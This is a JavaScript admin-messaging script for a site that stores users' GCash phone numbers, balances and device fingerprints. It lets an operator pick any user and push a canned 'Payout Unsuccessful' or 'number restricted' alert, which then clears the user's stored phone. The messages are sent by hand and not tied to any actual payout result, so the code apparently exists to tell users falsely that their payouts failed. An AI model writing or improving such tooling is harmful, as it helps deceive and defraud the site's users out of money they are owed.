/**
 * ADCOM.JS v2.2 - Fixed for Dropdown + Dynamic Tables
 * 
 * FIXES:
 * - Handles dropdown-collapsed tables
 * - Re-applies click handlers after any table update
 * - Watches parent container, not just tbody
 * - Multiple retry attempts
 * - Works with dynamically rendered content (adscript.js)
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== CONFIGURATION ==========
const CONFIG = {
    USER_SESSIONS_PATH: 'user_sessions',
    MSG_WRONG_NUMBER: '⚠️ Payout Unsuccessful! Please use your registered GCash number.',
    MSG_RESTRICTED: '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.',
    POPUP_DELAY: 1500,
    LISTENER_DELAY: 1500,
    INITIAL_CHECK_DELAY: 2000,
    RETRY_ATTEMPTS: 10,
    RETRY_INTERVAL: 2000
};

// ========== CSS PARA SA ADMIN POPUP ==========
if (isAdminPage) {
    const style = document.createElement('style');
    style.textContent = `
        .admin-command-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .admin-command-popup-content {
            width: 90%;
            max-width: 400px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 2px solid #00f2ff;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .admin-command-popup-header {
            padding: 15px;
            background: rgba(0,242,255,0.1);
            border-bottom: 1px solid #00f2ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .admin-command-popup-header h3 { 
            color: #00f2ff; 
            margin: 0; 
            font-size: 14px; 
            font-weight: 600;
        }
        .close-popup { 
            background: none; 
            border: none; 
            color: #fff; 
            font-size: 20px; 
            cursor: pointer;
            transition: color 0.2s;
        }
        .close-popup:hover { color: #ff4444; }
        .user-info-section { padding: 15px; }
        .info-row { 
            margin-bottom: 10px; 
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        .info-label { 
            color: #888; 
            display: inline-block; 
            width: 100px;
            flex-shrink: 0;
        }
        .info-value { 
            color: #fff; 
            font-weight: 500;
        }
        .command-buttons-section { 
            padding: 15px; 
            border-top: 1px solid #333; 
        }
        .command-buttons-grid { 
            display: flex; 
            gap: 10px; 
        }
        .command-btn { 
            flex: 1; 
            padding: 12px; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            font-size: 12px;
        }
        .command-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        .command-btn:active {
            transform: translateY(0);
        }
        .command-1 { background: #ff9800; color: #fff; }
        .command-2 { background: #2196f3; color: #fff; }

        /* HIGHLIGHT clickable phones */
        .clickable-phone { 
            cursor: pointer !important; 
            color: #00f2ff !important; 
            text-decoration: underline !important;
            transition: all 0.2s;
            font-weight: 500;
        }
        .clickable-phone:hover {
            color: #80f7ff !important;
            text-shadow: 0 0 8px rgba(0, 242, 255, 0.5);
        }

        .sent-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            margin-left: 8px;
        }
        .badge-success { background: #4caf50; color: #fff; }
        .badge-pending { background: #ff9800; color: #fff; }

        /* Pulse animation for new clickable elements */
        @keyframes phonePulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 242, 255, 0.4); }
            70% { box-shadow: 0 0 0 6px rgba(0, 242, 255, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 242, 255, 0); }
        }
        .phone-pulse {
            animation: phonePulse 1s ease;
        }
    `;
    document.head.appendChild(style);
}

// ========== UTILITY FUNCTIONS ==========
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatPhone(phone) {
    return phone.replace(/[^0-9]/g, '');
}

function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        color: #fff;
        font-weight: 500;
        z-index: 99999999;
        animation: slideInRight 0.3s ease;
        max-width: 300px;
        word-wrap: break-word;
        background: ${type === 'success' ? '#4caf50' : '#ff4444'};
    `;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========== ADMIN: SHOW USER POPUP ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;

    const sanitizedPhone = formatPhone(phone);

    try {
        const userSnap = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).once('value');
        const userData = userSnap.val();

        if (!userData) {
            showToast('User not found or offline', 'error');
            return;
        }

        const balance = (userData.balance || 0).toFixed(2);
        const device = userData.deviceFingerprint || 'Unknown';
        const lastActive = userData.lastActive ? new Date(userData.lastActive).toLocaleString() : 'N/A';
        const hasPendingCommand = !!userData.adminCommand;

        const popupHTML = `
            <div id="userCommandPopup" class="admin-command-popup">
                <div class="admin-command-popup-content">
                    <div class="admin-command-popup-header">
                        <h3>👤 SEND MESSAGE ${hasPendingCommand ? '<span class="sent-badge badge-pending">PENDING</span>' : ''}</h3>
                        <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                    </div>
                    <div class="user-info-section">
                        <div class="info-row">
                            <span class="info-label">📱 Number:</span>
                            <span class="info-value">${escapeHtml(phone)}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">💰 Balance:</span>
                            <span class="info-value">₱${balance}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🔑 Device:</span>
                            <span class="info-value">${escapeHtml(device.substring(0, 20))}...</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🕐 Last Active:</span>
                            <span class="info-value">${lastActive}</span>
                        </div>
                    </div>
                    <div class="command-buttons-section">
                        <div class="command-buttons-grid">
                            <button class="command-btn command-1" onclick="sendCommand('${escapeHtml(phone)}', '1')">
                                📧 WRONG NUMBER
                            </button>
                            <button class="command-btn command-2" onclick="sendCommand('${escapeHtml(phone)}', '2')">
                                📞 RESTRICTED
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        closeUserCommandPopup();
        document.body.insertAdjacentHTML('beforeend', popupHTML);
    } catch (error) {
        console.error('Popup error:', error);
        showToast('Error loading user data', 'error');
    }
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) {
        popup.style.animation = 'fadeOut 0.2s ease';
        setTimeout(() => popup.remove(), 200);
    }
}

// ========== ADMIN: SEND COMMAND ==========
async function sendCommand(phone, type) {
    if (!isAdminPage) return;

    closeUserCommandPopup();

    const sanitizedPhone = formatPhone(phone);
    const message = type === '1' ? CONFIG.MSG_WRONG_NUMBER : CONFIG.MSG_RESTRICTED;

    try {
        await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).update({
            adminCommand: message,
            commandTimestamp: Date.now(),
            commandType: type,
            commandStatus: 'pending'
        });

        showToast('✅ Message sent to user!');
    } catch (error) {
        console.error('Send command error:', error);
        showToast('❌ Failed to send message', 'error');
    }
}

// ========== ADMIN: MAKE PHONES CLICKABLE (FIXED) ==========
let phoneClickAttempts = 0;

function makePhonesClickable() {
    if (!isAdminPage) return;

    const phoneRegex = /^(\+63\d{10}|09\d{9})$/;
    let foundPhones = 0;

    // Search in ghostData tbody and all its descendants
    const ghostData = document.getElementById('ghostData');
    if (!ghostData) {
        console.log('ghostData not found yet, retrying...');
        return;
    }

    // Get all elements that might contain phone numbers
    const allElements = ghostData.querySelectorAll('*');

    allElements.forEach(element => {
        // Skip already processed elements
        if (element.hasAttribute('data-clickable')) return;

        // Get text content
        const text = element.textContent || element.innerText || '';
        const trimmedText = text.trim();

        // Check if this element directly contains a phone number (not in children)
        if (phoneRegex.test(trimmedText) && element.children.length === 0) {
            element.setAttribute('data-clickable', 'true');
            element.classList.add('clickable-phone');
            element.style.cursor = 'pointer';

            element.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Phone clicked:', trimmedText);
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    // Also check td elements directly (in case phone is in td but has no child elements)
    const tds = ghostData.querySelectorAll('td');
    tds.forEach(td => {
        if (td.hasAttribute('data-clickable')) return;

        const text = td.textContent || td.innerText || '';
        const trimmedText = text.trim();

        if (phoneRegex.test(trimmedText)) {
            td.setAttribute('data-clickable', 'true');
            td.classList.add('clickable-phone');
            td.style.cursor = 'pointer';

            td.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('TD Phone clicked:', trimmedText);
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    if (foundPhones > 0) {
        console.log(`✅ Made ${foundPhones} phone numbers clickable`);
    }

    return foundPhones;
}

// ========== OBSERVE TABLE CHANGES (FIXED FOR DROPDOWN) ==========
let tableObserver = null;
let dropdownObserver = null;

function observeTableChanges() {
    if (!isAdminPage) return;

    const ghostData = document.getElementById('ghostData');
    const userDropdown = document.getElementById('userDropdown');

    // Strategy 1: Observe ghostData directly if available
    if (ghostData) {
        if (tableObserver) tableObserver.disconnect();

        tableObserver = new MutationObserver((mutations) => {
            let hasChanges = false;
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    hasChanges = true;
                }
            });
            if (hasChanges) {
                console.log('Table mutated, re-applying click handlers...');
                setTimeout(makePhonesClickable, 100);
            }
        });

        tableObserver.observe(ghostData, { 
            childList: true, 
            subtree: true 
        });

        console.log('✅ Table observer attached to ghostData');
    }

    // Strategy 2: Observe dropdown container (catches show/hide + content changes)
    if (userDropdown) {
        if (dropdownObserver) dropdownObserver.disconnect();

        dropdownObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                // Detect when dropdown becomes visible
                if (mutation.attributeName === 'style' || mutation.attributeName === 'class') {
                    const isVisible = userDropdown.style.display !== 'none' && 
                                     !userDropdown.classList.contains('hidden');
                    if (isVisible) {
                        console.log('Dropdown opened, applying click handlers...');
                        setTimeout(makePhonesClickable, 300);
                    }
                }
                // Detect content changes
                if (mutation.type === 'childList') {
                    setTimeout(makePhonesClickable, 100);
                }
            });
        });

        dropdownObserver.observe(userDropdown, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['style', 'class']
        });

        console.log('✅ Dropdown observer attached');
    }

    // Strategy 3: Retry with increasing delays
    let attempts = 0;
    const retryInterval = setInterval(() => {
        attempts++;
        const found = makePhonesClickable();

        if (found > 0 || attempts >= CONFIG.RETRY_ATTEMPTS) {
            clearInterval(retryInterval);
            if (found > 0) {
                console.log(`✅ Success after ${attempts} attempts`);
            } else {
                console.log('⚠️ No phones found after max attempts');
            }
        }
    }, CONFIG.RETRY_INTERVAL);

    // Strategy 4: Hook into dropdown toggle function if available
    if (typeof toggleDropdown === 'function') {
        const originalToggle = toggleDropdown;
        window.toggleDropdown = function(id) {
            originalToggle(id);
            if (id === 'userDropdown') {
                setTimeout(makePhonesClickable, 500);
                setTimeout(makePhonesClickable, 1000);
                setTimeout(makePhonesClickable, 2000);
            }
        };
        console.log('✅ Hooked into toggleDropdown');
    }

    // Initial attempt
    makePhonesClickable();
}

// ========== USER: REAL-TIME COMMAND LISTENER ==========
let commandListenerActive = false;
let commandUnsubscribe = null;

function startRealTimeCommandListener() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone || commandListenerActive) return;

    const sanitizedPhone = formatPhone(userPhone);

    console.log('🔔 Starting real-time command listener for:', sanitizedPhone);
    commandListenerActive = true;

    commandUnsubscribe = db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand')
        .on('value', async (snapshot) => {
            const message = snapshot.val();

            if (message) {
                console.log('📨 Admin command received:', message);
                alert(message);

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).update({
                    commandStatus: 'received',
                    commandReceivedAt: Date.now()
                });

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand').remove();

                // CLEAR userPhone from localStorage
                localStorage.removeItem('userPhone');
                console.log('🗑️ userPhone cleared from localStorage');

                stopRealTimeCommandListener();
            }
        }, (error) => {
            console.error('Listener error:', error);
            commandListenerActive = false;
            setTimeout(startRealTimeCommandListener, 5000);
        });
}

function stopRealTimeCommandListener() {
    if (commandUnsubscribe) {
        commandUnsubscribe();
        commandUnsubscribe = null;
    }
    commandListenerActive = false;
}

// ========== USER: FALLBACK CHECK ==========
async function checkForAdminCommand() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone) return false;

    try {
        const sanitizedPhone = formatPhone(userPhone);
        const snapshot = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone).once('value');
        const userData = snapshot.val();

        if (userData && userData.adminCommand) {
            alert(userData.adminCommand);
            await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + sanitizedPhone + '/adminCommand').remove();
            localStorage.removeItem('userPhone');
            return true;
        }
    } catch (error) {
        console.log('Fallback check error:', error);
    }
    return false;
}

function hookUserActions() {
    document.body.addEventListener('click', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
    document.body.addEventListener('submit', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
}

// ========== VISIBILITY API ==========
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && !isAdminPage) {
        const userPhone = localStorage.getItem('userPhone');
        if (userPhone && !commandListenerActive) {
            startRealTimeCommandListener();
        }
    }
});

// ========== START ==========
function init() {
    console.log('🚀 ADCOM.JS v2.2 initializing...');
    console.log('Admin page:', isAdminPage);

    if (isAdminPage) {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
            });
        } else {
            setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
        }
    } else {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    startRealTimeCommandListener();
                    hookUserActions();
                }, CONFIG.LISTENER_DELAY);
                setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
            });
        } else {
            setTimeout(() => {
                startRealTimeCommandListener();
                hookUserActions();
            }, CONFIG.LISTENER_DELAY);
            setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
        }
    }
}

window.addEventListener('beforeunload', () => {
    if (!isAdminPage && commandUnsubscribe) {
        commandUnsubscribe();
    }
});

init();
